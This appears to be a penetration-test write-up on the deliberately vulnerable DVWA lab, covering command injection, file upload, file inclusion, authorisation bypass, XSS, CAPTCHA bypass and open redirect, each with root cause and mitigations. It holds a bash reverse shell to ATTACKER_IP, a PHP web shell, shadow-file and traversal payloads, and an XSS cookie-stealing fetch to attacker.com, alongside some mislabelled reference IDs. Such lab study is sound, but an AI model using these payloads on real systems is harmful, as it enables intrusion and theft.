## 1. Command Injection

>**Vulnerability ID:** VULN-DVWA-2024-COMMAND-INJECTION  
   **Risk Level:** Critical  
   **CVSS Score:** 9.1 (Critical)

### 1. Business Impact Analysis

- **System Compromise:** Attackers can execute arbitrary operating system commands on the server
- **Data Breach:** Access to sensitive files, databases, and system information 
- **Lateral Movement:** Use compromised server to attack internal network resources
- **Compliance Violations:** Breach of data protection regulations and security standards
### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**
- Search for unsafe system command execution functions in source code:
    - `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`
- Identify user-controlled input used in command execution without validation
- Check for absence of input sanitization and command whitelisting
- Look for command concatenation without proper escaping

**Vulnerability Location Identified:**  
The application contains a command injection vulnerability in the IP address parameter of the ping functionality:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/exec/
```
![[pics/Pasted image 20251106215402.png]]
### 3. Exploitation Analysis

**Attack Vector:** Command Concatenation  
The application directly concatenates user input into system commands without proper sanitization.

**Payload Testing Sequence:**

```bash
8.8.8.8; whoami
8.8.8.8 && id
8.8.8.8; cat /etc/passwd
8.8.8.8 | head /etc/shadow
8.8.8.8; ifconfig
```
# Reverse shell establishment
```bash
8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Bypass Techniques:**
- Command separators: `;`, `&&`, `||`, `|`
- Backtick command substitution
- Newline characters (`\n`)
- Encoding and obfuscation techniques
- Environment variable substitution

**Successful Exploitation:**  
The payload `8.8.8.8; cat /etc/passwd` successfully retrieved the system's password file, confirming command execution capabilities.

![[Pasted image 20251106220104.png]]

### 4. Vulnerability Root Cause

**Vulnerable Code:**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
        // Get input
        $target = $_REQUEST[ 'ip' ];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
                // Windows
                $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
                // *nix
                $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        $html .= "<pre>{$cmd}</pre>";
}

?>
```
**Primary Issues:**
1. **Direct Command Concatenation:** User input directly appended to system commands
2. **No Input Validation:** Absence of IP address format validation
3. **Lack of Sanitization:** No filtering of command separators or special characters
4. **Unsafe Function Usage:** Use of `shell_exec()` with untrusted input

### 5. Mitigation Strategies

**Secure Code Implementation:**  
Implement strict input validation and use parameterized command execution.
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

        // Get input
        $target = $_REQUEST[ 'ip' ];
        $target = stripslashes( $target );

        // Split the IP into 4 octects
        $octet = explode( ".", $target );

        // Check IF each octet is an integer
        if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
                // If all 4 octets are int's put the IP back together.
                $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

                // Determine OS and execute the ping command.
                if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
                        // Windows
                        $cmd = shell_exec( 'ping  ' . $target );
                }
                else {
                        // *nix
                        $cmd = shell_exec( 'ping  -c 4 ' . $target );
                }

                // Feedback for the end user
                $html .= "<pre>{$cmd}</pre>";
        }
        else {
                // Ops. Let the user name theres a mistake
                $html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
        }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

**Defense-in-Depth Measures:**

1. **Input Validation:**
    - Whitelist allowed characters for IP addresses
    - Use built-in PHP validation filters
2. **Command Sanitization:**
    - Use `escapeshellarg()` or `escapeshellcmd()`
    - Implement argument arrays instead of string concatenation
3. **System Hardening:**
    - Run web server with minimal privileges
    - Use application sandboxing where possible
4. **Security Controls:**
    - Implement Web Application Firewall (WAF) rules
    - Regular security code reviews
    - Input validation at multiple layers

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|Critical|High|Critical|
|System Integrity|Critical|High|Critical|
|Service Availability|High|High|Critical|
|Compliance|Critical|High|Critical|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Test with basic injection payloads (`; whoami`, `&& id`)
2. Verify IP address format validation rejects malformed input
3. Test command separator filtering (`;`, `&`, `|`, `` ` ``)
4. Confirm proper error handling for invalid inputs
5. Test boundary conditions and edge cases

**Post-Mitigation Testing Results:**

- Command injection attempts return validation errors
- Only properly formatted IP addresses are accepted
- No unauthorized command execution occurs

### Appendix A: Reference Materials

- **OWASP Command Injection:** [https://owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)- **CWE-78: Improper Neutralization of Special Elements used in an OS Command** - [https://cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html)
- **MITRE ATT&CK:** T1059 - Command and Scripting Interpreter
- **PHP Security Best Practices:** [https://www.php.net/manual/en/security.php](https://www.php.net/manual/en/security.php)

## 2. File Upload 
>**Vulnerability ID:** VULN-DVWA-2024-FILE-UPLOAD  
   **Risk Level:** Critical  
   **CVSS Score:** 9.3 (Critical)

### 1. Business Impact Analysis

- **Remote Code Execution:** Attackers can upload web shells to gain complete server control        
- **Malware Distribution:** Server can be used to host and distribute malicious software
- **Compliance Violations:** Breach of data protection regulations and security standards

### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**
- Search for file upload handlers without proper validation checks
- Identify missing file type verification (MIME type, file extension, content)
- Check for absence of file size restrictions and name sanitization
- Look for insecure file storage locations with execution permissions

**Vulnerability Location Identified:**  
The application contains an unrestricted file upload vulnerability allowing malicious file uploads:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/upload/
```
![[Pasted image 20251106234553.png]]
### 3. Exploitation Analysis

**Attack Vector:** Malicious File Upload  
The application accepts file uploads without proper validation, enabling attackers to upload executable web shells.

**Web Shell Creation:**

```php
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```
**reverse Shell :** https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

**Bypass Techniques:**

- File extension manipulation (.php, .phtml, .php5, .phar)
- Double extensions (shell.php.jpg)
- MIME type spoofing (image/jpeg for PHP file)
- Magic byte injection (GIF89a headers)
- Null byte injection (shell.php%00.jpg)

**Successful Exploitation:**  
The malicious PHP web shell was successfully uploaded and accessible at:

```powershell
http://192.168.1.4/DVWA/hackable/uploads/shell.php
```
![[Pasted image 20251106230659.png]]

then run it by open this link `http://192.168.1.4/DVWA/vulnerabilities/192.168.1.4/DVWA/hackable/uploads/rev_shell.php`
![[Pasted image 20251106231102.png]]
### 4. Vulnerability Root Cause

**Vulnerable Code:**
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
                // No
                $html .= '<pre>Your image was not uploaded.</pre>';
        }
        else {
                // Yes!
                $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
        }
}
?>
```

**Primary Issues:**

1. **No File Type Validation:** Absence of file extension and MIME type checking
2. **Missing Content Verification:** No magic byte or file content validation
3. **Unrestricted Upload Directory:** Files stored in web-accessible location with execution permissions
4. **No File Name Sanitization:** Original file names preserved, enabling double extensions
5. **Lack of Size Restrictions:** No limits on uploaded file size

### 5. Mitigation Strategies

**Server Configuration Hardening:**

```apache 
# .htaccess protection for upload directory
<FilesMatch "\.(php|php5|phtml|phar)$">
    Deny from all
</FilesMatch>

# Prevent execution in upload directory
<Directory "/var/www/html/uploads">
    php_flag engine off
    RemoveHandler .php .php5 .phtml
    RemoveType .php .php5 .phtml
</Directory>
```
**Defense-in-Depth Measures:**

1. **Input Validation:**
    - Whitelist allowed file extensions and MIME types
    - Validate file content using magic bytes
    - Implement file size restrictions
2. **File Handling:**
    - Generate random file names to prevent direct access
    - Store files outside web root when possible
    - Remove execution permissions from uploaded files
3. **Server Security:**
    - Configure web server to prevent execution in upload directories
    - Implement virus scanning for uploaded files
    - Use Web Application Firewall (WAF) rules
4. **Monitoring:**
    - Log all file upload attempts
    - Monitor upload directory for suspicious files
    - Implement file integrity checking

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|Critical|High|Critical|
|System Integrity|Critical|High|Critical|
|Service Availability|High|High|Critical|
|Compliance|Critical|High|Critical|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Attempt to upload PHP web shell - should be rejected
2. Test double extension bypass (shell.php.jpg) - should be blocked
3. Verify MIME type spoofing detection
4. Test file size limit enforcement
5. Confirm safe file (image, PDF) uploads still function
6. Verify uploaded files cannot be executed

**Post-Mitigation Testing Results:**

- PHP files and other executables are blocked
- Only whitelisted file types are accepted
- File names are sanitized and randomized
- Upload directory prevents script execution

### Appendix A: Reference Materials

- **OWASP Unrestricted File Upload:** [https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- **CWE-434: Unrestricted Upload of File with Dangerous Type** - [https://cwe.mitre.org/data/definitions/434.html](https://cwe.mitre.org/data/definitions/434.html)
- **SANS Secure File Upload Guide:** [https://www.sans.org/blog/secure-file-upload/](https://www.sans.org/blog/secure-file-upload/)
- **MITRE ATT&CK:** T1105 - Ingress Tool Transfer

## 3. File inclusion
>**Vulnerability ID:** CVE-2024-32982  
   **Risk Level:** High  
   **CVSS Score:** 8.2 (High)
### 1. Business Impact Analysis
- **Data Breach:** Exposure of sensitive system and application data
- **System Compromise:** Full server control possible via Remote File Inclusion (RFI)
- **Reputation Damage:** Loss of customer trust and business credibility
### 2. Vulnerability Identification Methods
**Code Analysis Patterns:**
- Search for unsafe PHP functions in source code:
    - `include()`, `require()`, `include_once()`, `require_once()`
    - `file_get_contents()`, `fopen()`, `readfile()`
- Identify user-controlled input used in file operations without proper validation
- Check for absence of input sanitization and whitelisting mechanisms
**Vulnerability Location Identified:**  
The application contains a file inclusion vulnerability in the `page` parameter:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/fi/?page=file1.php
```
![[Pasted image 20251106201514.png]]

### 3. Exploitation Analysis
**Attack Vector:** Directory Traversal  
The `page` parameter accepts file paths without validation, allowing directory traversal attacks.
**Payload Testing Sequence:**
```powershell
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
```
**Bypass Techniques:**
- URL encoding variations
- Double encoding
- Null byte injection (if applicable)
- Protocol wrappers (php://filter, data://, etc.)

**Successful Exploitation:**  
The payload `../../../../../../etc/passwd` successfully retrieved the system's password file, confirming the vulnerability.

![[Pasted image 20251106203258.png]]

### 4. Vulnerability Root Cause

**Vulnerable Code:**

```php
<?php  
// The page we wish to display  
$file = $_GET[ 'page' ];  
?>
```

**Primary Issues:**
1. No input validation or sanitization
2. Direct use of user input in file operations
3. Absence of whitelisting mechanism
4. Lack of path traversal protection

### 5. Mitigation Strategies
**Secure Code Implementation:**
```php

<?php
// Define allowed pages (whitelist approach)
$allowed_pages = array('home', 'about', 'contact', 'services');

// Get user input with default fallback
$page = isset($_GET['page']) ? $_GET['page'] : 'home';

// Sanitize: Allow only alphanumeric characters
$page = preg_replace('/[^a-zA-Z0-9]/', '', $page);

// Validate against whitelist
if (in_array($page, $allowed_pages)) {
    // Use absolute path to prevent directory traversal
    include(__DIR__ . '/templates/' . $page . '.php');
} else {
    // Secure error handling
    http_response_code(404);
    header('Content-Type: text/plain');
    echo 'Page not found.';
    exit;
}
?>
```
**Defense-in-Depth Measures:**
1. **Input Validation:**
    - Implement strict whitelisting of allowed file names
    - Validate input against expected patterns
2. **Sanitization:**
    - Remove or encode special characters
    - Use built-in sanitization functions
3. **Secure Configuration:**
	 `php.ini configuration
    `allow_url_include = Off
    `allow_url_fopen = Off
    `open_basedir = /var/www/html
4. **Additional Security Controls:**
    - Implement web application firewall (WAF) rules
    - Regular security code reviews
    - Automated vulnerability scanning

### 6. Risk Assessment Matrix

| Impact Area          | Severity | Likelihood | Overall Risk |
| -------------------- | -------- | ---------- | ------------ |
| Data Confidentiality | High     | High       | Critical     |
| System Integrity     | High     | High       | Critical     |
| Service Availability | Medium   | Medium     | High         |
| Compliance           | High     | High       | Critical     |
### 7. Testing Verification
**Remediation Validation Steps:**
1. Test with traversal payloads (`../../../etc/passwd`)
2. Verify whitelist enforcement
3. Confirm proper error handling
4. Test boundary conditions and edge cases

### Appendix A: Reference Materials

- **OWASP File Inclusion Vulnerability:** [https://owasp.org/www-community/attacks/File_Inclusion](https://owasp.org/www-community/attacks/File_Inclusion)
- **CWE-98:** Improper Control of Filename for Include/Require Statement
- **MITRE ATT&CK:** T1221 - Template Injection


## Authorisation Bypass 

>**Vulnerability ID:**
   **Risk Level:** High  
   **CVSS Score:** 8.1 (High)

### 1. Business Impact Analysis

- **Privilege Escalation:** Attackers can gain unauthorized access to administrative or user-specific functions.
- **Data Breach:** Exposure of sensitive user data, personal identifiable information (PII), and internal application data.
- **System Compromise:** Allows attackers to perform actions as an authenticated user, leading to full application control.

### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**

- Identify access control checks in server-side code, looking for missing or flawed authorisation logic.
- Search for direct page references, function names, or parameters in URLs that are not validated against a user's session or role.
- Check for "hidden" URLs or predictable resource locations that are not protected by access control middleware.

**Vulnerability Location Identified:**  
The application fails to validate user permissions before granting access to restricted pages, allowing direct browsing to admin URLs.
#### As a low-privileged user, directly accessing the admin page:
```powershell
http://192.168.1.4/DVWA/vulnerabilities/authbypass/
```

![[Pasted image 20251106233939.png]]

### 3. Exploitation Analysis

**Attack Vector:** Direct Request (Forceful Browsing)  
An attacker who is logged in with a low-privilege account (e.g., `user`) can simply modify the URL to navigate to pages intended for administrators.

**Exploitation Steps:**
1. Log in to the application with a low-privilege user account (e.g., credentials: `user` / `password`).
2. Observe the limited functionality available in the user interface.
3. Manually change the browser's URL to point to a known or guessed administrative page (e.g., `/admin.php`, `/weak_auth/admin.php`).
4. The server grants access to the administrative interface without verifying the user's role.

**Successful Exploitation:**  
The attacker successfully accesses the `admin.php` page, which displays sensitive administrative information and controls, confirming the authorisation bypass.
![[Pasted image 20251106234008.png]]

### 4. Vulnerability Root Cause

**Vulnerable Logic:**  
The application relies on the user being logged in (authentication) but does not check _what_ they are authorized to do (authorisation) on each privileged page.

**Primary Issues:**
1. **Missing Access Control Checks:** Restricted pages lack server-side verification of the user's role or permissions.
2. **Over-reliance on Client-Side Controls:** The application may hide administrative links in the UI for non-admin users, but the underlying functionality remains directly accessible.
3. **Broken Access Control:** The design violates the principle of "default deny," where access should be denied unless explicitly permitted.

### 5. Mitigation Strategies

**Secure Code Implementation:**  
Implement a robust, server-side access control check on every privileged page or function.

```php

<?php
// admin.php or other protected pages

// Start session and include base functions
session_start();
include_once 'db_connect.php';

// Check if user is both logged in AND has the required admin role
if (!isset($_SESSION['user_id'])) {
    header('HTTP/1.1 401 Unauthorized');
    die('You must be logged in.');
}

// Fetch user details, including role, from the database
$user_id = $_SESSION['user_id'];
$query = "SELECT role FROM users WHERE id = ?";
$stmt = $pdo->prepare($query);
$stmt->execute([$user_id]);
$user = $stmt->fetch();

// Authorisation Check: Verify the user has the 'admin' role
if ($user['role'] !== 'admin') {
    header('HTTP/1.1 403 Forbidden');
    die('Access Denied: Insufficient privileges.');
}

// ... Proceed with rendering the admin page content ...
?>
```
**Defense-in-Depth Measures:**

1. **Role-Based Access Control (RBAC):** Implement a centralised RBAC system to manage permissions.
2. **Server-Side Validation:** Never trust the client. Re-validate permissions for every request to a protected resource.
3. **Default Deny Policy:** Configure the application to deny access by default, only granting it when a user's role is explicitly permitted.
4. **Security Headers:** Use security headers to protect against certain classes of attacks, though they are not a primary fix for this issue.
5. **Regular Audits:** Conduct periodic penetration testing and code reviews focused on access control flaws.

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|High|High|Critical|
|System Integrity|High|High|Critical|
|Service Availability|Medium|Medium|High|
|Compliance|High|High|Critical|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Log in as a low-privilege user (`user` / `password`).
2. Attempt to directly browse to the previously vulnerable admin page (`/admin.php`).
3. **Expected Result:** The application should return a `403 Forbidden` error and not display the admin page content.
4. Log in as a legitimate admin user (`admin` / `password`) and verify that access to the admin page is still functional.
5. Test other privileged endpoints to ensure the access control checks are consistently applied.
### Appendix A: Reference Materials

- **OWASP Broken Access Control:** [https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- **CWE-285: Improper Authorization** - [https://cwe.mitre.org/data/definitions/285.html](https://cwe.mitre.org/data/definitions/285.html)
- **MITRE ATT&CK:** [T1472 - Create Account](https://attack.mitre.org/techniques/T1136/)

## Cross-Site Scripting (XSS) 

>**Vulnerability ID:** VULN-DVWA-2024-XSS  
   **Risk Level:** High (Stored), Medium (Reflected), Low (DOM)  
   **CVSS Score:** 8.5 (Stored), 6.1 (Reflected), 4.3 (DOM)

### 1. Business Impact Analysis
- **Session Hijacking:** Attackers can steal user sessions and authentication tokens
- **Credential Theft:** Capture usernames and passwords through fake login forms
- **Defacement:** Modify website content and appearance for all users
- **Malware Distribution:** Redirect users to malicious sites or deliver drive-by downloads
- **Data Theft:** Extract sensitive information from user browsers and forms
- **Reputation Damage:** Loss of customer trust and business credibility

### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**

- Search for unsanitized user input output in HTML context
- Identify missing output encoding in dynamic content generation
- Check for JavaScript execution sinks (`innerHTML`, `document.write`, `eval`)
- Look for direct DOM manipulation with user-controlled data

### 3. Exploitation Analysis

#### 3.1 DOM-based XSS

**Vulnerability Location Identified:**  
Client-side JavaScript processes URL parameters without sanitization and writes to DOM:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/xss_d/?default=English
```

**Attack Vector:** URL Parameter Manipulation  
The application uses client-side JavaScript to read from URL and write to page without validation.

**Exploitation:**

```powershell
http://192.168.1.4/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
```
![[Pasted image 20251107000848.png]]
#### 3.2 Reflected XSS

**Vulnerability Location Identified:**  
Server reflects user input directly in HTTP response without encoding:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

**Attack Vector:** Input Field Manipulation  
User input is immediately reflected back in the response without sanitization.

**Exploitation:**

```html

<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Session cookie theft -->
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>

```
![[Pasted image 20251107000924.png]]
#### 3.3 Stored XSS

**Vulnerability Location Identified:**  
User input is stored in database and displayed to other users without sanitization:

```
powershell

http://192.168.1.4/DVWA/vulnerabilities/xss_s/
```
**Attack Vector:** Persistent Content Injection  
Malicious scripts are stored server-side and executed for every visitor.

**Exploitation:**

```html
<image/src/onerror=prompt(8)>
```
![[Pasted image 20251107001200.png]]

### 4. Vulnerability Root Cause

#### 4.1 DOM-based XSS Root Cause
**Primary Issues:**
- Direct use of `document.location.href` without validation
- Unsafe DOM manipulation with `document.write`
- No output encoding before writing to DOM

#### 4.2 Reflected XSS Root Cause
**Primary Issues:**

- Direct output of user input without encoding
- No context-aware output encoding
- Trusting client-supplied data

#### 4.3 Stored XSS Root Cause

**Primary Issues:**

- No input validation or output encoding
- Direct database insertion and retrieval of unsanitized data
- Persistent storage of malicious content

### 5. Mitigation Strategies

1. **Input Validation:**
    - Whitelist allowed characters and patterns
    - Validate data type, length, and format
    - Implement server-side validation
2. **Output Encoding:**
    - Use context-aware encoding (HTML, Attribute, JavaScript, CSS)
    - Implement automatic output encoding in templates
3. **Content Security Policy:**
    - Restrict script execution sources
    - Report policy violations
    - Implement strict CSP policies
4. **Security Headers:**
    - X-XSS-Protection header
    - X-Content-Type-Options
    - X-Frame-Options

### 6. Risk Assessment Matrix

|XSS Type|Impact Severity|Likelihood|Overall Risk|Persistence|
|---|---|---|---|---|
|Stored|Critical|High|Critical|Permanent|
|Reflected|High|Medium|High|One-time|
|DOM|Medium|Low|Medium|Client-side|

**Post-Mitigation Testing Results:**

- All XSS payloads are properly encoded or rejected
- CSP headers effectively block unauthorized scripts
- User input is safely rendered without execution

### Appendix A: Reference Materials

- **OWASP XSS Prevention Cheat Sheet:** [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **OWASP DOM-based XSS Prevention Cheat Sheet:** [https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- **CWE-79: Improper Neutralization of Input During Web Page Generation** - [https://cwe.mitre.org/data/definitions/79.html](https://cwe.mitre.org/data/definitions/79.html)
- **Content Security Policy Reference:** [https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## insecure Captcha

>**Vulnerability ID:** VULN-DVWA-2024-INSECURE-CAPTCHA  
   **Risk Level:** Medium  
   **CVSS Score:** 6.5 (Medium)

### 1. Business Impact Analysis

- **Account Takeover:** Attackers can bypass security controls to reset passwords and compromise user accounts
- **Automated Attacks:** Enables brute force and automated scripting attacks that CAPTCHA is meant to prevent
- **Data Breach:** Unauthorized access to sensitive user data and administrative functions
- **System Integrity Compromise:** Allows malicious actors to manipulate system configurations

### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**

- Search for CAPTCHA implementations that separate verification from protected actions
- Identify multi-step processes where security validation occurs in different requests
- Check for absence of server-side session validation between process steps
- Look for client-side only validation that can be bypassed

**Vulnerability Location Identified:**  
The CAPTCHA implementation in the password change functionality contains a logical flaw in the two-step verification process:

```bash
POST /DVWA/vulnerabilities/captcha/step1.php  # CAPTCHA verification
POST /DVWA/vulnerabilities/captcha/step2.php  # Password change (no re-validation)
```
<img src="./u115o0z1.png" style="width:6.84375in;height:3.53125in" />

### 3. Exploitation Analysis

**Attack Vector:** Request Manipulation  
The vulnerability exists because the second POST request (password change) does not re-validate the CAPTCHA solution from the first request.

**Exploitation Steps:**

1. Complete initial CAPTCHA verification through normal user interaction
2. Intercept the subsequent password change request using a proxy tool like Burp Suite
3. Observe two separate POST requests without session validation between them
4. Modify the password parameter in the second request while bypassing CAPTCHA

<img src="./jqlaogsq.png" style="width:6.84375in;height:3.47917in" /> <img src="./42dv1ba0.png" style="width:6.84375in;height:3.46875in" />

**Successful Exploitation:**  
The payload with modified password ("pass123") was accepted with HTTP 200 OK response, confirming the CAPTCHA bypass.

### 4. Vulnerability Root Cause

**Vulnerable Code Logic:**  
The application implements CAPTCHA verification and password change as separate steps without maintaining verification state.

**Primary Issues:**

1. **Stateless Validation:** CAPTCHA verification in step 1 doesn't create persistent server-side state
2. **Missing Session Tracking:** No `$_SESSION` variable to track CAPTCHA completion status
3. **Separate Request Vulnerability:** Step 2 executes independently without re-validating step 1 completion
4. **Client-Side Reliance:** Over-reliance on client progressing through UI flow correctly

### 5. Mitigation Strategies

1. **Single Request Process:** Combine CAPTCHA verification and protected action in one request
2. **Session State Management:** Use server-side sessions to track security validation states
3. **Time-based Expiry:** Implement short timeouts for security validations (5-10 minutes)
4. **CSRF Protection:** Include anti-CSRF tokens in multi-step processes
5. **Request Integrity Checks:** Validate the sequence and integrity of process steps

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|Medium|High|Medium|
|System Integrity|Medium|High|Medium|
|Authentication Security|High|Medium|Medium|
|Compliance|Medium|Medium|Medium|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Attempt to send password change request without completing CAPTCHA verification
2. Verify the application returns 403 Forbidden when CAPTCHA session flag is missing
3. Test CAPTCHA timeout expiration after 5 minutes
4. Confirm legitimate workflow still functions with proper CAPTCHA completion

<img src="./surxbwzn.png" style="width:6.84375in;height:3.69792in" />

### Appendix A: Reference Materials

- **OWASP CAPTCHA Guide:** [https://owasp.org/www-community/controls/CAPTCHA](https://owasp.org/www-community/controls/CAPTCHA)
- **CWE-837: Improper Enforcement of Behavioral Workflow** - [https://cwe.mitre.org/data/definitions/837.html](https://cwe.mitre.org/data/definitions/837.html)
  
  
## OPEN REDIRECT  

>**Vulnerability ID:** VULN-DVWA-2024-OPEN-REDIRECT  
   **Risk Level:** Low  
   **CVSS Score:** 4.3 (Medium)
---
### 1. Business Impact Analysis
- **Phishing Attacks:** Can be used to create convincing phishing links that appear to originate from trusted domains
- **User Trust Exploitation:** Attackers leverage legitimate domains to redirect to malicious sites
- **Credential Theft:** Redirect users to fake login pages to harvest authentication credential
- **Malware Distribution:** Redirect to sites hosting malware, ransomware, or drive-by downloads
- **Reputation Damage:** Legitimate domains being used in phishing campaigns

### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**

- Search for unsanitized user input used in redirect headers (`Location`, `Redirect`)
- Identify parameters containing URLs or paths (`url`, `redirect`, `next`, `return`, `info`
- Check for absence of allow-list validation for redirect destinations
- Look for direct use of user input in `header("Location: ...")` calls

**Vulnerability Location Identified:**  
The application accepts user-controlled input in the `info` parameter without validation, allowing arbitrary redirects:

powershell

http://192.168.1.4/DVWA/vulnerabilities/redirect/?info=https://google.com

<img src="./m4pv3dmj.png" style="width:6.84375in;height:3.47917in" /> <img src="./ehbu0i3g.png" style="width:6.84375in;height:3.47917in" />

### 3. Exploitation Analysis

**Attack Vector:** URL Parameter Manipulation  
The `info` parameter accepts any URL and performs immediate redirects without validation checks.

**Exploitation Steps:**
1. Identify vulnerable redirect parameter in application URLs
2. Test with external domains to confirm open redirect vulnerability
3. Craft malicious URLs using the trusted domain as a redirector
4. Use social engineering to trick users into clicking the manipulated links

<img src="./cai5eokf.png" style="width:6.84375in;height:3.69792in" /> <img src="./emrz4vcd.png" style="width:6.84375in;height:3.47917in" />

**Successful Exploitation:**  
The payload `https://google.com` in the `info` parameter successfully redirected users to the external site, confirming the vulnerability.

### 4. Vulnerability Root Cause

**Vulnerable Code:**

php

<?php
$redirect = $_GET['info'];
header("Location: " . $redirect);
?>

**Primary Issues:**

1. **No Input Validation:** Direct use of unsanitized user input in redirect headers
2. **Missing Allow-List Implementation:** Absence of approved destination validation
3. **Protocol Scheme Abuse:** Allows external URLs with `http://`, `https://`, and other dangerous schemes
4. **Lack of Domain Enforcement:** No verification that redirects stay within application domain boundaries

### 5. Mitigation Strategies

1. **Strict Allow-List Validation:** Only permit predefined, relative paths for redirects    
2. **Scheme Restriction:** Block all external URL schemes and protocols
3. **Domain Enforcement:** Ensure all redirects remain within current application domain
4. **Input Sanitization:** Remove or encode special characters in redirect paths
5. **Safe Fallback Handling:** Implement secure error handling for invalid redirect attempts

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|Low|High|Low|
|User Security|Medium|Medium|Low|
|Trust & Reputation|Medium|Low|Low|
|Compliance|Low|Low|Low|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Test with external URLs (`https://google.com`) - should be blocked with 400 error
2. Test with internal relative paths (`/home.php`) - should redirect properly
3. Test path traversal attempts (`../../../etc/passwd`) - should be blocked
4. Test dangerous protocol schemes (`javascript:alert(1)`) - should be blocked
5. Verify proper error handling and safe fallbacks for invalid redirect attempts

<img src="./dhfvnojl.png" style="width:6.84375in;height:3.69792in" />

### Appendix A: Reference Materials

- **OWASP Unvalidated Redirects and Forwards:** [https://owasp.org/www-project-top-ten/2017/A10_2017-Unvalidated_Redirects_and_Forwards](https://owasp.org/www-project-top-ten/2017/A10_2017-Unvalidated_Redirects_and_Forwards)
- **CWE-601: URL Redirection to Untrusted Site** - [https://cwe.mitre.org/data/definitions/601.html](https://cwe.mitre.org/data/definitions/601.html)
- **MITRE ATT&CK:** T1566.002 - Phishing: Spearphishing Link
